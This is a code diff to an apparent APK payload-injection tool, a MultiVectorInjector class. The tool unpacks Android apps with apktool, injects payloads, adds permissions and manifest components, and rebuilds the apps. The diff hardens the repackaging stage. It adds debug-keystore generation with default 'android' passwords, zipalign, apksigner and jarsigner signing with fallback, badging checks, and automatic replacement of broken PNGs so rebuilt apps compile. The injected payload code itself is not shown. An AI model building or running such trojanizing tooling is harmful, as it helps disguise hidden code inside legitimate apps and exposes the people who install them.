@@ -14,6 +14,13 @@ from dataclasses import dataclass
 from datetime import datetime
 import xml.etree.ElementTree as ET
 import json
+import base64
+try:
+    from PIL import Image  # type: ignore
+    _HAVE_PIL = True
+except Exception:
+    Image = None  # type: ignore
+    _HAVE_PIL = False
 
 @dataclass
 class InjectionPoint:
@@ -582,6 +589,107 @@ class MultiVectorInjector:
         self.workspace = workspace_dir
         self.smali_generator = SmaliCodeGenerator()
         self.native_generator = NativeLibraryGenerator()
+        # Tooling and flags
+        self.enable_apksigner = os.environ.get("ENABLE_APKSIGNER", "false").lower() == "true"
+        self.tools_dir = Path("/workspace/tools/android-sdk")
+        self.apktool_jar = Path("/workspace/tools/apktool/apktool.jar")
+        self.zipalign = self._prefer_tool("zipalign")
+        self.apksigner = self._prefer_tool("apksigner")
+        self.aapt = self._prefer_tool("aapt")
+        self.aapt2 = self._prefer_tool("aapt2")
+        # Diagnostics of last failing step
+        self.last_error: str = ""
+        self.debug_keystore = Path("/workspace/debug.keystore")
+    
+    def _prefer_tool(self, name: str) -> Optional[str]:
+        repo_path = self.tools_dir / name
+        if repo_path.exists():
+            return str(repo_path)
+        sys_path = shutil.which(name)
+        return sys_path
+    
+    def _run(self, cmd: List[str], timeout: int = 300) -> Tuple[bool, str]:
+        try:
+            proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
+            ok = proc.returncode == 0
+            out = (proc.stdout + "\n" + proc.stderr).strip()
+            return ok, out
+        except Exception as e:
+            return False, str(e)
+    
+    def _ensure_debug_keystore(self) -> bool:
+        if self.debug_keystore.exists():
+            return True
+        # Generate Android debug keystore with default android passwords
+        try:
+            ok, _ = self._run([
+                "keytool", "-genkey", "-v",
+                "-keystore", str(self.debug_keystore),
+                "-alias", "androiddebugkey",
+                "-keyalg", "RSA", "-keysize", "2048",
+                "-validity", "10000",
+                "-storepass", "android", "-keypass", "android",
+                "-dname", "CN=Android Debug,O=Android,C=US"
+            ], timeout=60)
+            return ok
+        except Exception:
+            return False
+    
+    def _zipalign_apk(self, unsigned_apk: Path) -> Path:
+        if not self.zipalign:
+            # No zipalign available; return original path
+            return unsigned_apk
+        aligned_path = unsigned_apk.with_suffix(".aligned.apk")
+        ok, _ = self._run([self.zipalign, "-v", "4", str(unsigned_apk), str(aligned_path)], timeout=120)
+        return aligned_path if ok and aligned_path.exists() else unsigned_apk
+    
+    def _apksigner_sign(self, apk_path: Path, sign_cfg: Dict[str, str]) -> bool:
+        if not self.apksigner:
+            return False
+        ks = sign_cfg.get("keystore_path") or str(self.debug_keystore)
+        alias = sign_cfg.get("key_alias") or "androiddebugkey"
+        ksp = sign_cfg.get("keystore_password") or "android"
+        kpp = sign_cfg.get("key_password") or "android"
+        # apksigner sign
+        cmd = [
+            self.apksigner, "sign",
+            "--ks", ks,
+            "--ks-key-alias", alias,
+            "--ks-pass", f"pass:{ksp}",
+            "--key-pass", f"pass:{kpp}",
+            str(apk_path)
+        ]
+        ok, _ = self._run(cmd, timeout=300)
+        if not ok:
+            return False
+        # verify
+        return self._apksigner_verify(apk_path)
+    
+    def _apksigner_verify(self, apk_path: Path) -> bool:
+        if not self.apksigner:
+            return False
+        ok, _ = self._run([self.apksigner, "verify", "--verbose", str(apk_path)], timeout=60)
+        return ok
+    
+    def _jarsigner_sign(self, apk_path: Path, sign_cfg: Dict[str, str]) -> bool:
+        # Fallback legacy signing using jarsigner
+        ks = sign_cfg.get("keystore_path") or str(self.debug_keystore)
+        alias = sign_cfg.get("key_alias") or "androiddebugkey"
+        ksp = sign_cfg.get("keystore_password") or "android"
+        kpp = sign_cfg.get("key_password") or "android"
+        ok, _ = self._run([
+            "jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
+            "-keystore", ks, "-storepass", ksp, "-keypass", kpp,
+            str(apk_path), alias
+        ], timeout=300)
+        return ok
+    
+    def _aapt_badging_ok(self, apk_path: Path) -> bool:
+        tool = self.aapt2 or self.aapt
+        if not tool:
+            return True  # no tool to check, do not block
+        ok, _ = self._run([tool, "dump", "badging", str(apk_path)], timeout=60)
+        return ok
     
     def analyze_injection_vectors(self, apk_path: Path, analysis_result: Dict[str, Any]) -> List[InjectionPoint]:
         """Analyze and identify optimal injection vectors"""
@@ -732,7 +840,7 @@ class MultiVectorInjector:
         )
     
     def inject_payload(self, apk_path: Path, output_path: Path, 
-                      injection_strategy: InjectionStrategy) -> bool:
+                      injection_strategy: InjectionStrategy, sign_config: Optional[Dict[str, str]] = None) -> bool:
         """Execute multi-vector payload injection"""
         
         try:
@@ -748,29 +856,29 @@ class MultiVectorInjector:
             for injection_point in injection_strategy.injection_points:
                 success = self._inject_at_point(extract_dir, injection_point, injection_strategy)
                 if not success:
-                    print(f"Failed to inject at {injection_point.target_name}")
+                    print(f"Injection failed at point: {injection_point.location_type}:{injection_point.target_name}")
             
-            # Add required permissions
+            # Add required permissions and components
             self._add_required_permissions(extract_dir, injection_strategy)
-            
-            # Add new components to manifest
             self._add_manifest_components(extract_dir, injection_strategy)
             
-            # Recompile APK
-            success = self._recompile_apk(extract_dir, output_path)
+            # Recompile + align + sign
+            success = self._recompile_apk(extract_dir, output_path, sign_config or {})
             
-            # Cleanup
-            shutil.rmtree(temp_dir, ignore_errors=True)
+            # Cleanup temp dir (best-effort)
+            try:
+                shutil.rmtree(temp_dir, ignore_errors=True)
+            except Exception:
+                pass
             
             return success
-            
         except Exception as e:
-            print(f"Injection failed: {e}")
+            print(f"Error in inject_payload: {e}")
             return False
     
     def _extract_apk(self, apk_path: Path, extract_dir: Path):
         """Extract APK using apktool"""
-        apktool_path = "/workspace/tools/apktool/apktool.jar"
+        apktool_path = str(self.apktool_jar)
         if not Path(apktool_path).exists():
             raise Exception("Apktool not found")
         
@@ -975,52 +1083,167 @@ class MultiVectorInjector:
                              content[app_end:])
                 manifest_file.write_text(new_content)
     
-    def _recompile_apk(self, extract_dir: Path, output_path: Path) -> bool:
-        """Recompile APK using apktool"""
-        
-        apktool_path = "/workspace/tools/apktool/apktool.jar"
-        
-        cmd = [
-            "java", "-jar", apktool_path, "b",
-            str(extract_dir), "-o", str(output_path)
-        ]
-        
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
-        
-        if result.returncode == 0:
-            # Sign the APK
-            return self._sign_apk(output_path)
-        else:
-            print(f"Recompilation failed: {result.stderr}")
-            return False
-    
-    def _sign_apk(self, apk_path: Path) -> bool:
-        """Sign APK with debug keystore"""
-        
+    def _recompile_apk(self, extract_dir: Path, output_path: Path, sign_cfg: Optional[Dict[str, str]] = None) -> bool:
+        """Recompile APK using apktool, then zipalign and sign (apksigner if enabled, else jarsigner)."""
+        sign_cfg = sign_cfg or {}
+        # Repair invalid PNGs that break aapt/aapt2
         try:
-            debug_keystore = "/workspace/debug.keystore"
-            
-            # Create debug keystore if it doesn't exist
-            if not Path(debug_keystore).exists():
-                subprocess.run([
-                    "keytool", "-genkey", "-v", "-keystore", debug_keystore,
-                    "-alias", "androiddebugkey", "-keyalg", "RSA", "-keysize", "2048",
-                    "-validity", "10000", "-keypass", "android", "-storepass", "android",
-                    "-dname", "CN=Android Debug,O=Android,C=US"
-                ], check=True, capture_output=True)
-            
-            # Sign APK
-            subprocess.run([
-                "jarsigner", "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
-                "-keystore", debug_keystore, "-storepass", "android",
-                "-keypass", "android", str(apk_path), "androiddebugkey"
-            ], check=True, capture_output=True)
-            
-            return True
-            
-        except subprocess.CalledProcessError as e:
-            print(f"APK signing failed: {e}")
+            self._fix_invalid_pngs(extract_dir)
+        except Exception:
+            pass
+        # Build unsigned APK
+        apktool_path = str(self.apktool_jar)
+        ok, out = self._run(["java", "-jar", apktool_path, "b", str(extract_dir), "-o", str(output_path)], timeout=900)
+        if not ok or not output_path.exists():
+            # Attempt targeted repair based on apktool diagnostics, then retry
+            try:
+                repaired = self._repair_pngs_from_log(out, extract_dir)
+                if repaired:
+                    print(f"Repaired {repaired} PNGs from apktool log; retrying build")
+                    ok, out2 = self._run(["java", "-jar", apktool_path, "b", str(extract_dir), "-o", str(output_path)], timeout=900)
+                    out = out + "\n" + out2
+            except Exception:
+                pass
+        if (not ok or not output_path.exists()) and self.aapt2:
+            # Retry with aapt2
+            print("apktool build failed; retrying with --use-aapt2")
+            ok2, out2 = self._run(["java", "-jar", apktool_path, "b", str(extract_dir), "--use-aapt2", "-o", str(output_path)], timeout=900)
+            ok = ok2 and output_path.exists()
+            out = out + "\n" + out2
+        if not ok or not output_path.exists():
+            self.last_error = f"apktool build failed:\n{out}".strip()
+            print(f"Recompilation failed\n{out}")
             return False
+        
+        # Ensure keystore exists (debug by default)
+        if not sign_cfg.get("keystore_path"):
+            self._ensure_debug_keystore()
+        
+        # Zipalign before signing
+        aligned = self._zipalign_apk(output_path)
+        if aligned != output_path:
+            try:
+                # Replace original with aligned
+                output_path.unlink(missing_ok=True)  # type: ignore
+                aligned.rename(output_path)
+            except Exception:
+                pass
+        
+        # Select signing method
+        signed_ok = False
+        if self.enable_apksigner and self.apksigner:
+            signed_ok = self._apksigner_sign(output_path, sign_cfg)
+            if not signed_ok:
+                self.last_error = (self.last_error + "\n" if self.last_error else "") + "apksigner signing failed"
+                print("apksigner signing failed; attempting fallback jarsigner")
+        if not signed_ok:
+            # Fallback to jarsigner
+            signed_ok = self._jarsigner_sign(output_path, sign_cfg)
+            if signed_ok and self.apksigner:
+                # If apksigner exists, still verify
+                signed_ok = self._apksigner_verify(output_path) or signed_ok
+        
+        if not signed_ok:
+            if not self.last_error:
+                self.last_error = "signing failed"
+            return False
+        
+        # Post-build validation (non-verbose)
+        if not self._aapt_badging_ok(output_path):
+            self.last_error = (self.last_error + "\n" if self.last_error else "") + "aapt/aapt2 badging failed"
+            print("aapt/aapt2 badging failed")
+            return False
+        
+        return True
+
+    def _fix_invalid_pngs(self, extract_dir: Path) -> None:
+        """Replace any res/**/*.png that is not a valid PNG signature with a tiny valid PNG placeholder.
+        Keeps original as .orig for debugging.
+        """
+        png_sig = b"\x89PNG\r\n\x1a\n"
+        # 1x1 transparent PNG
+        tiny_png_b64 = b"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/woAAgMBgWn3mXQAAAAASUVORK5CYII="
+        tiny_png = base64.b64decode(tiny_png_b64)
+        res_dir = extract_dir / "res"
+        if not res_dir.exists():
+            return
+        fixed = 0
+        # Force-replace known problematic app icon basename across densities
+        for p in res_dir.rglob("ic_application.png"):
+            try:
+                backup = p.with_suffix(p.suffix + ".orig")
+                if not backup.exists():
+                    shutil.copy2(p, backup)
+                with open(p, "wb") as f:
+                    f.write(tiny_png)
+                fixed += 1
+            except Exception:
+                continue
+        for p in res_dir.rglob("*.png"):
+            try:
+                # First: signature check
+                with open(p, "rb") as f:
+                    header = f.read(8)
+                bad = header != png_sig
+                # Second: decode verification via Pillow if available
+                if not bad and _HAVE_PIL:
+                    try:
+                        with Image.open(p) as im:  # type: ignore
+                            im.verify()
+                    except Exception:
+                        bad = True
+                if bad:
+                    # Backup original
+                    try:
+                        backup = p.with_suffix(p.suffix + ".orig")
+                        if not backup.exists():
+                            shutil.copy2(p, backup)
+                    except Exception:
+                        pass
+                    with open(p, "wb") as f:
+                        f.write(tiny_png)
+                    fixed += 1
+            except Exception:
+                continue
+        if fixed:
+            print(f"Replaced {fixed} invalid PNGs with placeholders to satisfy aapt")
+
+    def _repair_pngs_from_log(self, log_text: str, extract_dir: Path) -> int:
+        """Parse apktool/aapt output for problematic PNG paths and replace them with a tiny valid PNG.
+        Returns number of files repaired.
+        """
+        if not log_text:
+            return 0
+        tiny_png_b64 = b"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/woAAgMBgWn3mXQAAAAASUVORK5CYII="
+        tiny_png = base64.b64decode(tiny_png_b64)
+        repaired = 0
+        candidates: set[Path] = set()
+        for line in log_text.splitlines():
+            if ".png" in line and "/res/" in line:
+                # Extract path-like token ending with .png
+                parts = line.split()
+                for token in parts:
+                    if token.endswith(".png") and "/res/" in token:
+                        candidates.add(Path(token.strip()))
+        for raw in candidates:
+            try:
+                p = raw
+                if not p.is_absolute():
+                    p = extract_dir / p
+                if p.exists() and p.suffix.lower() == ".png":
+                    # backup
+                    try:
+                        backup = p.with_suffix(p.suffix + ".orig")
+                        if not backup.exists():
+                            shutil.copy2(p, backup)
+                    except Exception:
+                        pass
+                    with open(p, "wb") as f:
+                        f.write(tiny_png)
+                    repaired += 1
+            except Exception:
+                continue
+        return repaired
 
 # Export main classes
 __all__ = [
